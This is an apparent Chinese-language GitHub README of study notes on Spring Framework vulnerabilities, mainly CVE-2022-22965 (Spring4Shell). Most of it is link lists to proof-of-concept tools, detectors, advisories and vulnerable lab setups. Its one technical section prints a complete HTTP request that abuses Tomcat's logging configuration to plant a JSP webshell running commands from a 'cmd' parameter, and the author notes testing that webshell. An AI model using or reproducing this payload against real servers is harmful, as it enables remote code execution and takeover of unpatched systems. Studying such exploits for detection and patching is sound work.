# HackSpring-永恒之春

本项目用来致敬全宇宙最无敌Spring框架！同时也记录自己在学习Spring漏洞过程中遇到的一些内容。本项目会持续更新，本项目创建于2022年3月30日，最近的一次更新时间为2022年4月5日。作者：[0e0w](https://github.com/0e0w)

- [01-Spring基础知识]()
- [02-Spring框架识别]()
- [03-Spring上层建筑]()
- [04-Spring漏洞汇总]()
- [05-Spring检测利用]()
- [06-Spring漏洞修复]()
- [07-Spring分析文章]()
- [08-Spring靶场环境]()

## 01-Spring基础知识

## 02-Spring框架识别

- 待更新

## 03-Spring上层建筑

**Spring + ？ = rce ！**

## 04-Spring漏洞汇总

- CVE-2022-22965

## 05-Spring检测利用

如何判断一个网站是否存在Spring漏洞？如何查找内网中存在Sprin漏洞？

一、Payload

```
POST / HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 761

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22S%22.equals(request.getParameter(%22Tomcat%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=Shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

二、源码检测
- https://github.com/webraybtl/springcore_detect

三、漏洞验证

- 测试时发现webshell只能写入一次！第二次失败！

四、漏洞扫描

五、其他工具
- https://github.com/TheGejr/SpringShell
- https://github.com/BobTheShoplifter/Spring4Shell-POC
- https://github.com/kh4sh3i/Spring-CVE
- https://github.com/GuayoyoCyber/CVE-2022-22965
- https://github.com/viniciuspereiras/CVE-2022-22965-poc
- https://github.com/reznok/Spring4Shell-POC
- https://github.com/jschauma/check-springshell
- https://github.com/colincowie/Safer_PoC_CVE-2022-22965
- https://github.com/alt3kx/CVE-2022-22965_PoC
- https://github.com/exploitbin/CVE-2022-22963-Spring-Core-RCE
- https://github.com/light-Life/CVE-2022-22965-GUItools
- https://github.com/Mr-xn/spring-core-rce
- https://github.com/Kirill89/CVE-2022-22965-PoC
- https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE
- https://github.com/likewhite/CVE-2022-22965
- https://github.com/mebibite/springhound
- https://github.com/irgoncalves/f5-waf-enforce-sig-Spring4Shell
- https://github.com/hktalent/spring-spel-0day-poc
- https://github.com/darryk10/CVE-2022-22963
- https://github.com/WeiJiLab/Spring4Shell-POC

## 06-Spring漏洞修复

## 07-Spring分析文章

- https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html
- https://bugalert.org/content/notices/2022-03-29-spring.html
- https://websecured.io/blog/624411cf775ad17d72274d16/spring4shell-poc
- https://www.springcloud.io/post/2022-03/spring-0day-vulnerability
- https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement

## 08-Spring靶场环境

- https://github.com/jbaines-r7/spring4shell_vulnapp
- https://github.com/Kirill89/CVE-2022-22965-PoC
- https://github.com/DDuarte/springshell-rce-poc
- https://github.com/XuCcc/VulEnv

[![Stargazers over time](https://starchart.cc//HackJava/Spring.svg)](https://starchart.cc/HackJava/Spring)

